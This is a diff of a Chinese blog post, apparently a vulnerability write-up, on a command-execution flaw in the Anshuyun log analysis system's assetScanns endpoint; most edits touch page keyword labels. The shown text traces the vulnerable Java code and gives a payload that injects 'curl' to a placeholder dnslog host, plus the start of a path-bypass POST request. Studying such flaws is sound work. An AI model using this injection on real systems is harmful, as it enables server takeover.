@@ -7,17 +7,17 @@ asset_dir: assets/安数云综合日志分析系统-assetscanns-命令执行漏�
 # 安数云综合日志分析系统 assetScanns 命令执行漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/10/27 08:31
-- 812浏览
+- 813浏览
 - [0评论](#comment)
 - 41分钟阅读
 
 深入探索
 
-技术文章订阅
+honeypot
 
-企业安全咨询
+服务器
 
-数据库
+software
 
 ---
 
@@ -25,7 +25,7 @@ asset_dir: assets/安数云综合日志分析系统-assetscanns-命令执行漏�
 
 安数云日志审计系统是安数云公司自主研发的专业日志安全审计产品。该系统可以实时监视网络中的各种操作行为和攻击信息，通过事件监控模块监控网络设备、主机系统等的日志信息，及时发现正在发生和已经发生的安全事件，并通过响应模块采取措施，确保网络和业务系统的安全。安数云综合日志分析系统的 /assetTopo/assetScanns 接口存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该漏洞在服务器端执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。
 
-漏洞扫描服务
+漏洞修复方案
 
 # 影响版本
 
@@ -55,11 +55,11 @@ asset_dir: assets/安数云综合日志分析系统-assetscanns-命令执行漏�
 
 深入探索
 
-安全研究报告
+恶意软件分析工具
 
-代码安全审计
+漏洞预警服务
 
-在线安全工具
+服务器安全服务
 
 参数**ip**和**port**被带入**assetScann**方法中
 
@@ -86,14 +86,6 @@ public boolean assetScann(String fileSrc, String ip, String port) {
   }
 ```
 
-深入探索
-
-安全运维咨询
-
-授权
-
-SQL
-
 如果参数**port不为空或者null**这在拼接在`command`中 `-sV -p port`，然后再将`ip`拼接在后面，最后进入**getScannXmlFile**方法中
 
 ```
@@ -116,6 +108,8 @@ public static boolean execute(String cmd) {
 ```
 
 跟进**executeForStr**方法，其中对针对不同的系统使用 `cmd /c` 或者 `/bin/sh` 调用**Runtime.getRuntime().exec**[执行最终的命令](https://mrxn.net/tag/rce)
+
+计算机服务器
 
 ```
  public static String executeForStr(String cmd) {
@@ -157,7 +151,7 @@ public static boolean execute(String cmd) {
 
 该系统还存在几处需要adm权限（登录后）的[命令注入](https://mrxn.net/tag/rce)点，由于需要权限，暂不赘述。
 
-计算机服务器
+黑客与破解
 
 # 漏洞复现
 
@@ -173,7 +167,7 @@ ip=127.0.0.1;curl xxx.xx.xxx.dnslog.pt;&port=80
 
 [命令执行](https://mrxn.net/tag/rce)结果外带
 
-黑客与破解
+漏洞修复方案
 
 ```
 POST /js/..;/assetTopo/assetScanns HTTP/1.1
